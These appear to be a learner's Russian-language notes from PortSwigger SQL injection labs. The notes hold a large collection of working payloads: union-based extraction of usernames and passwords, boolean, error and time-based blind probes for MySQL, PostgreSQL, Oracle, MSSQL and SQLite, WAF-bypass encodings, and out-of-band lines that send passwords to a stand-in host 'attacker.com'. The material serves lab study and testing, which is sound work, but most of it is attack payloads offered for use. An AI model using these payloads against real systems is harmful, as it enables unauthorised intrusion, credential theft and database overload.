1 лаба =  разное в ответе число байт
' and 1 = 1--

2 лаба разное в ответе число байт
   --
'

3 лаба разное в ответе число байт
' ORDER BY 1--  
' UNION SELECT NULL,NULL,NULL--
'-- 

4 - 7 лабы тут срабатывал простой тест кавычкой

8 лаба   разное в ответе число байт
' AND (SE LECT * FROM dual)=1--
' AND (SELECT 1)=1--
' AND (SELECT @@version)=1--
' или ' ' разное в ответе число байт

9 лаба (вызывать ошибку намеренно )

' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
 ' AND (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')>1--


10 лаба вывод ошибки - превращение в видимую иньекциию
'||(SELECT '' FROM not-a-real-table)||'
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
CAST('text' AS int)  → ОШИБКА

'||(SELECT '' FROM dual)||'--      - ошбка - не оракл
' OR (SELECT '')=''--                      - работает значит MYSQl
' AND CONCAT('a','b')='ab'--     - работает значит MySQL
'||(SELECT '' WHERE ...)||'--        - ошибка - не постеджер
'||(SELECT '')||'--                             - работает - хз че это тогда 
' AND 'a'||'b'='ab'--                          -тоже работает
не обрезается ли запрос?
' AND 1=CAST((SELECT 'f') AS int)--

11 лаба временные задержки
' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 0 END)=1--
'||LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--
'||(SELECT randomblob(100000000))--
'||(SELECT COUNT(*) FROM sqlite_master a,sqlite_master b,sqlite_master c)--


' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(10) ELSE 0 END FROM dual)=0--
'||DBMS_LOCK.SLEEP(10)--
'||(SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c) FROM dual--

' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT COUNT(*) FROM sys.objects o1, sys.objects o2, sys.objects o3, sys.objects o4, sys.objects o5, sys.objects o6) END)--
'||sleep(10)--
'||BENCHMARK(10000000,MD5('test'))--
'||IF(1=1,SLEEP(10),0)--

' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NOT NULL--
'||pg_sleep(10)-- 
'||(SELECT COUNT(*) FROM generate_series(1,10000000))--

12 лаба нагрузочные тесты
'||(SELECT COUNT(*) FROM generate_series(1,1000000))--
'||(SELECT COUNT(*) FROM generate_series(1,100))--

13 oast

14 не строковые а цифровые пейлоады


------
-------
------

# === Базовые символы-разведчики (универсальные) ===

'

"

`

')

")

`)

'))

"))

`))

[

{

{

{

`

  

# === Проверка контекста и логики (универсальные) ===

1+1

2-1

-1

1*56

' OR '1'='1

" OR "1"="1

' OR 'a'='a

' AND '1'='1

' AND '1'='2

' OR 1=1

' OR 1=2

  

# === Комментирование остатка запроса (разные СУБД) ===

'-- 

'--+

'--

'# 

'/*test*/

')-- 

')--+

')#

')/*test*/

  

# === Провокация Boolean-based Blind SQLi (универсальные) ===

' AND '1'='1' AND '1'='1

' AND '1'='2' AND '1'='1

' OR '1'='2' OR '1'='1

admin' AND '1'='1

admin' AND '1'='2

  

# === Провокация Time-based Blind SQLi (БД-специфичные) ===

# MySQL / MariaDB

' OR SLEEP(2)-- 

' OR BENCHMARK(5000000,MD5('test'))-- 

' OR (SELECT * FROM (SELECT(SLEEP(2)))a)-- 

  

# PostgreSQL

' OR pg_sleep(2)-- 

' OR (SELECT pg_sleep(2))-- 

  

# Microsoft SQL Server

' WAITFOR DELAY '0:0:2'-- 

' OR (SELECT count(*) FROM sys.objects,sys.objects b)--  # Ресурсоемкий запрос

  

# SQLite (редко на вебе)

' OR (SELECT randomblob(1000000000))--  # Попытка создать большую нагрузку

  

# Oracle

' OR (SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual)--  # Может вызвать задержку


Вызвать ошибки mysql

  

  

' AND 1=0 AND (SELECT 1) IS NOT NULL -- 

' AND (SELECT 1 FROM (SELECT 1) a) -- 

' AND (SELECT 1) IN (SELECT 2) -- 

' AND (SELECT 1 UNION SELECT 2) -- 

' OR (SELECT 1)='2

' AND CAST('test' AS SIGNED INTEGER) -- 

' AND 1/0 -- 

' AND (SELECT 1/0 FROM DUAL) --

' OR EXP(~(SELECT*FROM(SELECT 1)x...

Ошибки postgere

  

  

' AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- - [citation:6]

' AND CAST((SELECT version()) AS INT)=1337 -- - [citation:6]

' AND (SELECT version())::int=1 --

' AND 1/0 --

' AND 'a'=5 --

' OR (SELECT 1)='2

Ошибки Microsoft server

  

  

' AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- - [citation:9]

' AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- - [citation:9]

' AND CAST((SELECT @@version) AS INT)=1337 --

' AND 1/0 --

' AND 'a'=5 --

Ошибки oracle 

  

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) --

' AND (SELECT 1 FROM DUAL)='2

' AND TO_NUMBER('test')=1 --

' AND (SELECT NULL FROM DUAL) IS NOT NULL --

' OR (SELECT 1 FROM DUAL)='2


Ошибки sqllite

' AND 1=2 AND (SELECT 1) IS NOT NULL --

' AND (SELECT 1) IN (SELECT 2) --

' OR (SELECT 1)='2

' AND abs(1/0) --  (попытка деления на ноль)

' AND CAST('test' AS INTEGER) --








'
"
`
')
")
`)
'))
"))
`))
--
; 
# 
/* 
*/ 
\ 
|| 
&& 
+ 
-


UNION
SELECT
FROM
WHERE
AND
OR
ORDER
BY
TABLE
COLUMN
DATABASE
INFORMATION_SCHEMA





----------
----------
----------

вызвать ошибку
вызвать задержку временем
вызвать задержку вычислениями
закоментить часть запроса
выполнить логическое действие



# ОБЩИЕ БАЗОВЫЕ ЛОМАЮЩИЕ SQL



# POSTGER 

# MYSQL

# SQLLITE

# ORACLE

# MICROSOFT SERVER


4 крайние лабы где нужно было выводить бд

слип - не срабатывал
еррор - не сработывал
но србатывал обычный order by 1...
и union select null,null.....

ну п потом определив число столбцов и их тип

я выводил данные! 

сначала версии

@@version
version()
baner from v$version  это у оракл так

'union+select+banner,+null+from+v$version--

помним - что для вывода данных нужно выводить в столбце и в типе стринг
поэтому просто так не вывести данные! сперва узнать число столбцов через order by
или юнион селект null,null...


для оракл специфичные ALL+SELECT, baner, 
не information_chema.tables а вот так all_tables
all_tab_columns вместо information_chema.columns


'UNION+ALL+SELECT+banner,+NULL+FROM+v$version-- вывело все сразу!

'UNION+SELECT+banner,+NULL+FROM+v$version-- вывело только линукс!

# 📚 **КОМПЛЕКТНЫЙ КОНСПЕКТ SQL INJECTION (PortSwigger Labs)**

## 🎯 **КЛАССИФИКАЦИЯ SQLi**

### **1. In-band (классические)**

- **Union-based** — через UNION извлекаем данные
    
- **Error-based** — через ошибки СУБД получаем данные
    

### **2. Blind (слепые)**

- **Boolean-based** — разный ответ при TRUE/FALSE
    
- **Time-based** — используем временные задержки
    
- **Out-of-band (OAST)** — через DNS/HTTP запросы
    

### **3. По контексту**

- **Строковый** — `WHERE name = '[INJECTION]'`
    
- **Числовой** — `WHERE id = [INJECTION]`
    
- **В ORDER BY/LIMIT** — `ORDER BY [INJECTION]`
    

---

## 🔧 **БАЗОВЫЕ ТЕХНИКИ**

### **Разведка (всегда сначала):**

sql

'   "   `   ')   ")   `)
'--   "--   #   /*comment*/
' OR '1'='1
' AND '1'='1
' AND '1'='2

### **Определение числа столбцов:**

sql

' ORDER BY 1--     -- увеличиваем до ошибки
' UNION SELECT NULL--  -- добавляем NULL

### **Определение типа СУБД:**

sql

-- MySQL: ' AND @@version IS NOT NULL--
-- PostgreSQL: ' AND version() IS NOT NULL--
-- Oracle: ' AND (SELECT '' FROM dual)=''--
-- MSSQL: ' AND @@version IS NOT NULL--

---

## 💥 **UNION-BASED АТАКИ (Лабы 1-4)**

### **Шаги:**

1. **Найти уязвимый параметр** (', ")
    
2. **Определить число столбцов** (ORDER BY или UNION NULL)
    
3. **Найти строковые столбцы** (подставляем 'a')
    
4. **Использовать UNION для извлечения**
    

### **Примеры:**

sql

-- Вывести все таблицы (PostgreSQL/MySQL)
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Вывести столбцы таблицы users
' UNION SELECT column_name,NULL FROM information_schema.columns 
WHERE table_name='users'--

-- Вывести данные
' UNION SELECT username||'~'||password,NULL FROM users--

---

## 🕵️ **BLIND SQLi (Слепые инъекции)**

### **Boolean-based (Лаба 1):**

sql

-- Проверка существования таблицы
' AND (SELECT 'a' FROM users LIMIT 1)='a'--

-- Поиск пароля посимвольно
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

### **Error-based (Лабы 2-3):**

sql

-- Провоцируем ошибку при TRUE условии
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

-- Извлекаем данные через ошибку (PostgreSQL)
' AND 1=CAST((SELECT password FROM users) AS int)--

### **Time-based (Лабы 4-5):**

sql

-- MySQL
' AND SLEEP(5)--
' || BENCHMARK(10000000,MD5('test'))--

-- PostgreSQL
' AND pg_sleep(5)--
' || (SELECT COUNT(*) FROM generate_series(1,10000000))--

-- Oracle
' AND DBMS_LOCK.SLEEP(5)=0--

-- MSSQL
' WAITFOR DELAY '0:0:5'--

### **Out-of-band (OAST) (Лаба 6):**

sql

-- DNS exfiltration
' || (SELECT load_file(concat('\\\\',(SELECT password),'.attacker.com\\test')))--

-- HTTP exfiltration  
' || UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password))--

---

## 🛡️ **ОБХОД WAF (Лаба 7)**

### **Кодировки:**

sql

-- URL encoding
%27 %20%4f%52%20%27%31%27%3d%27%31

-- HTML entities
&#x31; &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;

-- Double URL encoding
%2527 %2520%2541%254e%2544 %2531%253d%2531

### **Обфускация:**

sql

-- Разделение ключевых слов
SEL/**/ECT * FR/**/OM users

-- Использование синонимов
' OR 1 LIKE 1--   вместо ' OR 1=1--

### **Для числовых параметров:**

sql

3-1    -- если возвращает 2, значит параметр числовой
3 AND 1=1
3 AND 1=2

---

## 🗄️ **ОПРЕДЕЛЕНИЕ И ИССЛЕДОВАНИЕ БД**

### **Версии СУБД:**

sql

-- MySQL: @@version
-- PostgreSQL: version()
-- Oracle: SELECT banner FROM v$version
-- MSSQL: @@version
-- SQLite: sqlite_version()

### **Структура БД:**

sql

-- MySQL/PostgreSQL
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- MSSQL
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')

---

## 🎮 **ПРАКТИЧЕСКИЕ ПОДХОДЫ**

### **Алгоритм тестирования:**

text

1. Базовые символы: ' " ` -- #
2. Boolean тесты: AND 1=1, AND 1=2
3. Определение СУБД
4. UNION/Error-based тесты
5. Если не работает → Blind тесты
6. Если полная слепота → OAST

### **Для слепых SQLi:**

text

1. Проверить разницу: ' AND '1'='1 vs ' AND '1'='2
2. Если есть разница → Boolean-based
3. Если нет → Time-based тесты
4. Если не реагирует → OAST
## ⚡ **БЫСТРЫЕ ЧЕК-ЛИСТЫ**

### **Чек-лист обнаружения:**

- `'` — вызывает ошибку?
    
- `'--` — ошибка исчезает?
    
- `' AND '1'='1` — нормальный ответ?
    
- `' AND '1'='2` — другой ответ?
    
- `' UNION SELECT NULL--` — работает?
    
- `' AND SLEEP(5)--` — задержка?
### **Чек-лист эксплуатации:**

text

1. Найти уязвимость
2. Определить тип SQLi
3. Определить СУБД  
4. Определить контекст
5. Подобрать payload
6. Извлечь данные

### **Из вашего опыта:**

1. **Разные методы работают в разных ситуациях** — где-то только time-based, где-то только union
    
2. **WAF нужно обходить кодировками** — HTML/URL/double encoding
    
3. **Числовые параметры** — проверять через `1+1`, `3-1`
    
4. **Длина запроса** — может обрезаться, укорачивать payload
    
5. **Контекст важен** — строковый vs числовой vs ORDER BY

##  **ТАБЛИЦА ФУНКЦИЙ ПО СУБД**

```
##  **ТАБЛИЦА ФУНКЦИЙ ПО СУБД**

|Действие|MySQL|PostgreSQL|Oracle|MSSQL|SQLite|
|---|---|---|---|---|---|
|**Версия**|`@@version`|`version()`|`banner FROM v$version`|`@@version`|`sqlite_version()`|
|**Sleep**|`SLEEP(5)`|`pg_sleep(5)`|`DBMS_LOCK.SLEEP(5)`|`WAITFOR DELAY '0:0:5'`|`randomblob()`|
|**Подстрока**|`SUBSTRING()`|`SUBSTRING()`|`SUBSTR()`|`SUBSTRING()`|`SUBSTR()`|
|**Конкатенация**|`CONCAT()`|`\|`|`\|`|`+`|`\|`|
|**Комментарий**|`--` , `#`|`--`, `/* */`|`--`|`--`, `/* */`|`--`|
```


